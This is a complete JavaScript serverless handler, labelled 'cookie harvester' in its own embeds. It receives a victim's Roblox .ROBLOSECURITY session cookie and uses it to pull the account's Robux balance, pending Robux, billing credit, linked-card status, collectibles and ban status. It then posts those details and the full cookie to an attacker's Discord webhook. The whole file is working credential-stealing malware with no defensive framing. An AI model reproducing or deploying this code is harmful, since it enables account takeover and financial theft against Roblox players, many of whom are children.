// api/submit.js
const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;

// ---------- Helper: get CSRF token ----------
async function getCsrfToken(cookie) {
  // Roblox returns a CSRF token when you call this logout endpoint (even with GET)
  const res = await fetch("https://auth.roblox.com/v2/logout", {
    method: "GET",
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  const csrfToken = res.headers.get("x-csrf-token");
  if (!csrfToken) throw new Error("Failed to get CSRF token");
  return csrfToken;
}

// ---------- User info (public) ----------
async function getUser(userId) {
  const res = await fetch(`https://users.roblox.com/v1/users/${userId}`);
  if (!res.ok) throw new Error("User fetch failed");
  return await res.json();
}

function getAgeDays(createdDate) {
  return Math.floor((new Date() - new Date(createdDate)) / (1000 * 60 * 60 * 24));
}

// ---------- Robux balance ----------
async function getRobux(userId, cookie) {
  const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("Robux fetch failed");
  const data = await res.json();
  return { balance: data.robux || 0 };
}

// ---------- Pending Robux (from sales/group payouts) ----------
async function getPendingRobux(userId, cookie) {
  let pending = 0;
  try {
    const res = await fetch(`https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=Incoming&limit=100`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return pending;
    const data = await res.json();
    for (const tx of data.data || []) {
      if (tx.transactionType === "Sale" || tx.transactionType === "GroupPayout") {
        pending += tx.currency?.amount || 0;
      }
    }
  } catch (e) {
    console.warn("Pending Robux fetch error:", e);
  }
  return pending;
}

// ---------- User Settings (Verified, Banned, Email) from mobileapi ----------
async function getUserSettings(cookie, csrfToken) {
  const defaultSettings = { verified: "False", banned: "False", emailEnabled: "False" };
  try {
    const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "X-CSRF-TOKEN": csrfToken
      }
    });
    if (!res.ok) return defaultSettings;
    const data = await res.json();
    return {
      verified: data.IsVerified ? "True" : "False",
      banned: data.IsBanned ? "True" : "False",
      emailEnabled: data.Email ? "True" : "False"
    };
  } catch (e) {
    console.warn("User settings fetch error:", e);
    return defaultSettings;
  }
}

// ---------- Billing (Credit, Convert, Card) ----------
async function getBilling(cookie, csrfToken) {
  const defaultBilling = { credit: 0, convert: 0, card: "False" };
  try {
    const res = await fetch("https://www.roblox.com/billing/user/credit", {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "X-CSRF-TOKEN": csrfToken
      }
    });
    if (!res.ok) return defaultBilling;
    const html = await res.text();
    const creditMatch = html.match(/"creditAmount":(\d+)/);
    const convertMatch = html.match(/"convertedRobux":(\d+)/);
    const hasCard = html.includes('"isCardLinked":true');
    return {
      credit: creditMatch ? parseInt(creditMatch[1], 10) : 0,
      convert: convertMatch ? parseInt(convertMatch[1], 10) : 0,
      card: hasCard ? "True" : "False"
    };
  } catch (e) {
    console.warn("Billing fetch error:", e);
    return defaultBilling;
  }
}

// ---------- Groups (count only) ----------
async function getGroupsCount(userId) {
  try {
    const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
    if (!res.ok) return 0;
    const data = await res.json();
    return data.data?.length || 0;
  } catch (e) {
    return 0;
  }
}

// ---------- Total Place Visits (sum over all universes) ----------
async function getTotalPlaceVisits(userId) {
  let totalVisits = 0;
  let cursor = null;
  do {
    const url = `https://games.roblox.com/v2/users/${userId}/games?sortOrder=Asc&limit=50${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url);
    if (!res.ok) break;
    const data = await res.json();
    for (const game of data.data) {
      const detailsRes = await fetch(`https://games.roblox.com/v1/games?universeIds=${game.id}`);
      if (detailsRes.ok) {
        const details = await detailsRes.json();
        totalVisits += details.data[0]?.placeVisits || 0;
      }
    }
    cursor = data.nextPageCursor;
  } while (cursor);
  return totalVisits;
}

// ---------- Collectibles (first 3 names) ----------
async function getCollectibles(userId, cookie) {
  let items = [];
  let cursor = null;
  do {
    const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url, { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
    if (!res.ok) break;
    const data = await res.json();
    items.push(...data.data);
    cursor = data.nextPageCursor;
  } while (cursor);
  return items.slice(0, 3).map(item => item.name);
}

// ---------- Recently Played Games (for Played | Passes) ----------
async function getRecentlyPlayedGames(userId) {
  const url = `https://games.roblox.com/v1/users/${userId}/games?sortOrder=Desc&limit=50`;
  const res = await fetch(url);
  if (!res.ok) return [];
  const data = await res.json();
  return (data.data || []).map(game => game.name);
}

async function getPlayedPasses(userId) {
  const targetGames = ["Pet Simulator 99", "Breaking Point 2", "Murder Mystery 2"];
  const recentGames = await getRecentlyPlayedGames(userId);
  return targetGames.map(name => {
    const played = recentGames.some(g => g.toLowerCase().includes(name.toLowerCase()));
    return { name, played: played ? "True" : "False", passes: 0 };
  });
}

// ---------- Country flag from IP ----------
async function getCountryFlag(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  if (!ip || ip === '::1') return '🏠 Local';
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode`);
    const data = await geoRes.json();
    if (data.status === 'success' && data.countryCode) {
      const code = data.countryCode;
      const flag = code.split('').map(letter =>
        String.fromCodePoint(letter.charCodeAt(0) + 127397)
      ).join('');
      return `${flag} ${code}`;
    }
  } catch (e) {}
  return '🌍 Unknown';
}

// ---------- Avatar URL ----------
async function getUserAvatarUrl(userId) {
  try {
    const res = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`
    );
    if (!res.ok) return null;
    const data = await res.json();
    return data.data?.[0]?.imageUrl || null;
  } catch (e) {
    return null;
  }
}

// ---------- MAIN HANDLER ----------
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { cookie, rbxuid } = req.body;
  if (!cookie || !rbxuid) return res.status(400).json({ error: "Missing cookie or rbxuid" });
  if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL env var" });

  try {
    // 1. Get CSRF token (required for settings & billing)
    let csrfToken = null;
    try {
      csrfToken = await getCsrfToken(cookie);
    } catch (e) {
      console.warn("CSRF token fetch failed. Settings/Billing will use defaults.");
    }

    // 2. Fetch all data in parallel (some depend on csrfToken)
    const [userData, robux, pendingRobux, groupsCount, totalVisits, collectibles, playedPasses, countryFlag, avatarUrl] = await Promise.all([
      getUser(rbxuid),
      getRobux(rbxuid, cookie),
      getPendingRobux(rbxuid, cookie),
      getGroupsCount(rbxuid),
      getTotalPlaceVisits(rbxuid),
      getCollectibles(rbxuid, cookie),
      getPlayedPasses(rbxuid),
      getCountryFlag(req),
      getUserAvatarUrl(rbxuid)
    ]);

    // 3. Settings & Billing (only if we have CSRF token)
    let settings = { verified: "False", banned: "False", emailEnabled: "False" };
    let billing = { credit: 0, convert: 0, card: "False" };
    if (csrfToken) {
      [settings, billing] = await Promise.all([
        getUserSettings(cookie, csrfToken),
        getBilling(cookie, csrfToken)
      ]);
    }

    const accountAge = getAgeDays(userData.created);
    const summary = robux.balance + pendingRobux; // Summary = Balance + Pending
    const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");
    const rolimonsLink = `https://www.rolimons.com/player/${userData.id}`;
    const cookieThumb = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
    const robuxEmoji = "<:Robux:1495081542370726080>";

    // ---------- Stats Embed ----------
    const statsEmbed = {
      title: "🔱 Vyro Har - Result",
      description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
      color: 0x1E3A8A,
      thumbnail: { url: cookieThumb },
      image: avatarUrl ? { url: avatarUrl } : undefined,
      fields: [
        {
          name: "📌 About User",
          value: `**${userData.name}** (**${userData.displayName}**)\n**UserID:** \`${userData.id}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** ${totalVisits}\n**Country:** ${countryFlag}`,
          inline: false
        },
        {
          name: "💰 Robux",
          value: `${robuxEmoji} **Balance:** ${robux.balance}\n${robuxEmoji} **Pending:** ${pendingRobux}`,
          inline: true
        },
        {
          name: "💳 Billing",
          value: `**Credit:** ${billing.credit}\n**Convert:** ${billing.convert}\n**Card:** ${billing.card}`,
          inline: true
        },
        {
          name: "📊 Played | Passes",
          value: `\`\`\`\n${playedPassesText}\n\`\`\``,
          inline: false
        },
        {
          name: "📝 Summary",
          value: `**${summary}**`,
          inline: false
        },
        {
          name: "📊 Settings",
          value: `**(Verified)** ${settings.verified}\n**Is Banned** ${settings.banned}\n**Email Enabled** ${settings.emailEnabled}`,
          inline: true
        },
        {
          name: "🎁 Collectibles",
          value: collectibles.length ? collectibles.map(c => `**${c}**`).join("\n") : "**None**",
          inline: true
        },
        {
          name: "📊 Groups",
          value: `**Owned:** ${groupsCount}`,
          inline: true
        },
        {
          name: "🔗 Rolimons Profile",
          value: `[Click here](${rolimonsLink})`,
          inline: false
        }
      ],
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // ---------- Cookie Embed ----------
    const cookieEmbed = {
      title: "🍪 ***.ROBLOSECURITY***",
      description: `**Full Roblox Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
      color: 0x1E3A8A,
      thumbnail: { url: cookieThumb },
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // Send to Discord
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: "@everyone", username: "Vyro Harvest", embeds: [statsEmbed] })
    });
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Vyro Harvest", embeds: [cookieEmbed] })
    });

    return res.status(200).json({ success: true, firstTime: true });
  } catch (err) {
    console.error("Harvest error:", err);
    return res.status(500).json({ error: err.message });
  }
}
